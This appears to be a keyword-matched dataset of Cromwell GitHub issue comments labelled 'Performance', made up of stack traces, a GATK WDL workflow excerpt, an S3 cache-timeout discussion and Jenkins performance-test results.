[a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JES Run ID is operations/ENPH6N2AKxi-zoCK0M65gEAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:18,31] [info] JesRun [a3dd8163case_gatk_acn",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:12151,concurren,concurrent,12151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,ionalStatusPollingActor.scala:103); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.updateForStatusNames$1(OccasionalStatusPollingActor.scala:101); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.cromwell$backend$impl$aws$OccasionalStatusPollingActor$$updateStatuses(OccasionalStatusPollingActor.scala:118); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor$$anonfun$receive$1.$anonfun$applyOrElse$1(OccasionalStatusPollingActor.scala:57); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:659); 	at scala.util.Success.$anonfun$map$1(Try.scala:255); 	at scala.util.Success.map(Try.scala:213); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:292); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:6462,concurren,concurrent,6462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,4,['concurren'],['concurrent']
Performance,"is a glob and there are 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorker",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:1238,concurren,concurrent,1238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,1,['concurren'],['concurrent']
Performance,"ise reduction) on the proportional coverage file.; task NormalizeSomaticReadCounts {; String entity_id; File coverage_file; File padded_target_file; File pon; String gatk_jar; Int mem. command {; java -Xmx${mem}g -jar ${gatk_jar} NormalizeSomaticReadCounts --input ${coverage_file} \; --targets ${padded_target_file} --panelOfNormals ${pon} --factorNormalizedOutput ${entity_id}.fnt.tsv --tangentNormalized ${entity_id}.tn.tsv \; --betaHatsOutput ${entity_id}.betaHats.tsv --preTangentNormalized ${entity_id}.preTN.tsv --help false --version false --verbosity INFO --QUIET false; }. output {; File tn_file = ""${entity_id}.tn.tsv""; File pre_tn_file = ""${entity_id}.preTN.tsv""; File betahats_file = ""${entity_id}.betaHats.tsv""; }; #runtime {; # docker: ""gatk-protected/a1""; #}; }. # Segment the tangent normalized coverage profile.; task PerformSegmentation {; String entity_id; Float seg_param_alpha; Int seg_param_nperm; String seg_param_pmethod; Int seg_param_minWidth; Int seg_param_kmax; Int seg_param_nmin; Float seg_param_eta; Float seg_param_trim; String seg_param_undoSplits; Float seg_param_undoPrune; Int seg_param_undoSD; String gatk_jar; File tn_file; Int mem. command {; java -Xmx${mem}g -jar ${gatk_jar} PerformSegmentation --targets ${tn_file} \; --output ${entity_id}.seg --log2Input true --alpha ${seg_param_alpha} --nperm ${seg_param_nperm} \; --pmethod ${seg_param_pmethod} --minWidth ${seg_param_minWidth} --kmax ${seg_param_kmax} \; --nmin ${seg_param_nmin} --eta ${seg_param_eta} --trim ${seg_param_trim} --undoSplits ${seg_param_undoSplits} \; --undoPrune ${seg_param_undoPrune} --undoSD ${seg_param_undoSD} --help false --version false \; --verbosity INFO --QUIET false; }. output {; File seg_file = ""${entity_id}.seg""; }; }. # Make calls (amp, neutral, or deleted) on each segment.; task Caller {; String entity_id; String gatk_jar; File tn_file; File seg_file; Int mem. command {; java -Xmx${mem}g -jar ${gatk_jar} CallSegments --targets ${tn_file} \; --segments ${seg_file} ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:14250,Perform,PerformSegmentation,14250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['Perform'],['PerformSegmentation']
Performance,"istence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Re",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1767,cache,cache,1767,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cache']
Performance,ite(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparse,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8472,perform,performInitialHandshake,8472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['perform'],['performInitialHandshake']
Performance,"java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMonitorServiceActorSpec.scala:40); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventually(HealthMonitorServiceActorSpec.scala:20); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventualStatus(HealthMonitorServiceActorSpec.scala:32); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$new$5(HealthMonitorServiceActorSpec.scala:81); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:6758,concurren,concurrent,6758,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"k for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1096,cache,cache,1096,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['cache'],['cache']
Performance,"ker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4090,concurren,concurrent,4090,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,"l command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. java.lang.Throwable: Call w.hello, Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0: return code was (none). Full command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvid",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:4633,concurren,concurrent,4633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,"l failed workflows, 55 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/984/ (2 total failed workflows, 1 hr 5 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/988/ (15 total failed workflows, 1 hr 40 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/992/ (0 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/993/ (1 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.or",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:1262,Perform,PerformanceTest-against-Alpha,1262,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,1,['Perform'],['PerformanceTest-against-Alpha']
Performance,"l.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.ja",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6504,concurren,concurrent,6504,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,leLike.scala:777) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:777) ~[cromwell.jar:0.19]; at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cro,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5039,concurren,concurrent,5039,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['concurren'],['concurrent']
Performance,"llectQualityYieldMetrics:2]: Status change from Running to Failed; 3589854:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 ERROR - CallActor [UUID(129f0510):CollectQualityYieldMetrics:2]: Failing call: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589855:java.lang.Throwable: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589856- at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$handleFailure(JesBackend.scala:774) ~[cromwell.jar:0.19]; 3589857- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:685) ~[cromwell.jar:0.19]; 3589858- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19]; 3589859- at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at 